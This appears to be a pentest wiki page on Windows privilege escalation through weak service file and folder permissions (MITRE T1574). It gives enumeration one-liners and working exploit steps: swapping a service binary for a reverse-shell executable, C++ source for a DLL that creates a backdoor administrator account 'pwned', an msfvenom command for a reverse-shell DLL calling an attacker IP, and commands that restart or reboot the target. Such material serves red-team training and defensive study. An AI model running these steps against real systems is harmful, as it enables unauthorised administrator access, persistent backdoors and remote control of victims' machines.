---
description: MITRE ATT&CK™ Hijack Execution Flow - Technique T1574
---

# Weak File/Folder Permissions

## Theory

It is very often in Windows environments to discover services that run with SYSTEM privileges. If you have write permissions over the folder or binary used by the service you can use it to escalate you privileges.

## Practice

### Service Binary Hijacking

{% tabs %}
{% tab title="Enumerate" %}
Given sufficient permissions over a service's binary, swapping it with our own binary enables us to gain code execution as the user configured to run this service.

To identify weaknesses in service binary permissions, we can take the following steps: retrieve a complete list of all service binary files, retrieve their permissions, identify specific ones for our controlled user.

We can perform such enumeration by using one of the following methods:

#### CMD

```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

#### PowerShell

```powershell
Get-WmiObject Win32_Service | ForEach-Object { $serviceName = $_.Name; $path = $_.PathName; $startName = $_.StartName; if ($path -ne $null -and $path -ne "") { $formattedPath = if ($path -match '.*\.exe') { if ($path -match '^"(.+?\.exe)') { $matches[1] } else { $path -replace '^(.*\.exe).*', '$1' } } else { $path }; $acl = try { Get-Acl -Path $formattedPath -ErrorAction Stop } catch { $null }; if ($acl -ne $null) { $relevantACE = $acl | Select-Object -ExpandProperty Access | Where-Object { $_.FileSystemRights -match 'Write|FullControl|Modify' }; if ($relevantACE) { [PSCustomObject]@{ ServiceName = $serviceName; FormattedPath = $formattedPath; StartName = $startName; ACL = $relevantACE | Select-Object -Property IdentityReference, FileSystemRights | Format-List | Out-String } } } } } | Sort-Object -Property FormattedPath -Unique | Format-List
```

#### PowerUp

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

#### winPEAS

```powershell
winPEASx64.exe servicesinfo
```
{% endtab %}

{% tab title="Exploit" %}
If we find an editable service binary, we can simply replace it with a malicious one as follow:

```powershell
# Backup the binary
copy /y "c:\Program Files\File Permissions Service\filepermservice.exe" c:\Temp\filepermservice_backup.exe

# Hijack the binary 
copy /y c:\Temp\reverse.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```

Then, restart the service to trigger the execution

```powershell
#Using wmic
wmic service <Service_Name> call stopservice
wmic service <Service_Name> call startservice

#Using net
net stop <Service_Name> && net start <Service_Name>

#Using sc.exe
sc stop <Service_Name>
sc start <Service_Name>
```

{% hint style="success" %}
If we can't restart the service, we may check if it has `StartMode`set to `Auto`.&#x20;

If so, we can reboot the target to trigger the new binary (we will need the `SeShutdownPrivilege`for that).

```powershell
#Exemple of getting StartMode for MySVC
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'MySVC'}

#Reboot
shutdown /r /t 0 
```
{% endhint %}
{% endtab %}
{% endtabs %}

### Service DLL Hijacking

{% hint style="info" %}
DLL hijacking can be applied in many other cases, but this section focuses solely on services. For a more comprehensive approach, please refer to [this page](../dll-hijacking.md).
{% endhint %}

{% tabs %}
{% tab title="Enumerate" %}
In case you have write permissions over the service binary folder, we can write our DLL in and then hijack the DLL search order. Here is the default DLL search order in windows (in safe mode which is the default):&#x20;

1. The executable directory.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

We can enumerate permissive service folders by using the following PowerShell command

```powershell
Get-WmiObject Win32_Service | ForEach-Object { $s = $_.Name; $p = $_.PathName; $start = $_.StartName; if ($p -ne $null -and $p -ne "") { $f = if ($p -match '.*\.exe') { if ($p -match '^"(.+\\)') { $matches[1] } else { $p -replace '^(.*\\).*', '$1' } } else { $p }; $a = try { (Get-Acl -Path $f -ErrorAction Stop).Access | Where-Object { $_.FileSystemRights -match 'Write|FullControl|Modify' } } catch { $null }; if ($a) { [PSCustomObject]@{ ServiceName = $s; StartName = $start; ExecutableFolder = $f; FolderACL = $a | Select-Object IdentityReference, FileSystemRights | Format-List | Out-String } } } } | Sort-Object -Property ExecutableFolder -Unique | Format-List
```

If we find a writable service folder, we first want to exfiltrate its service binary to a local windows machine. On this controlled computer, download [Process Monitor (procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to monitor for missing or hijackable DLLs.

In procomon, specify this three filters (edit the service name with yours):

<figure><img src="../../../.gitbook/assets/Capture d’écran_2023-11-09_01-29-36.png" alt=""><figcaption><p>Procmon Filters</p></figcaption></figure>

We may find some `CreateFile` actions with a `NAME NOT FOUND` result for a dll inside of the writable service binary folder. If so we can use this DLL name for DLL Hijacking !

<figure><img src="../../../.gitbook/assets/Capture d’écran_2023-11-09_01-32-10.png" alt=""><figcaption><p>DLL Not Found</p></figcaption></figure>
{% endtab %}

{% tab title="Exploit" %}
If we've found a DLL we can hijack, the hard part is over. Now let's compile a custom DLL using the following code (in this example, the vulnerable DLL is named "hijackme.dll").

{% code title="hijackme.cpp" %}
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user pwned P@ssword! /add");
  	    i = system ("net localgroup administrators pwned /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
{% endcode %}

```bash
#Compile it
x86_64-w64-mingw32-gcc hijackme.cpp --shared -o hijackme.dll
```

Or use msfvenom to directly generate a malicious DLL.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<ATTACKING_PORT> EXITFUNC=thread -f dll -o hijackme.dll
```

Now, after transferring the DLL to the target host, copy the DLL to the path we found.

```powershell
# Hijack the DLL 
copy /y c:\Temp\hijackme.dll "C:\Program Files\Folder Permissions Service\hijackme.dll"
```

Finaly, restart the service to trigger the execution

```powershell
#Using wmic
wmic service <Service_Name> call stopservice
wmic service <Service_Name> call startservice

#Using net
net stop <Service_Name> && net start <Service_Name>

#Using sc.exe
sc stop <Service_Name>
sc start <Service_Name>
```

{% hint style="success" %}
If we can't restart the service, we may check if it has `StartMode`set to `Auto`.&#x20;

If so, we can reboot the target to trigger the new binary (we will need the `SeShutdownPrivilege`for that).

```powershell
#Exemple of getting StartMode for MySVC
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'MySVC'}

#Reboot
shutdown /r /t 0 
```
{% endhint %}
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services" %}
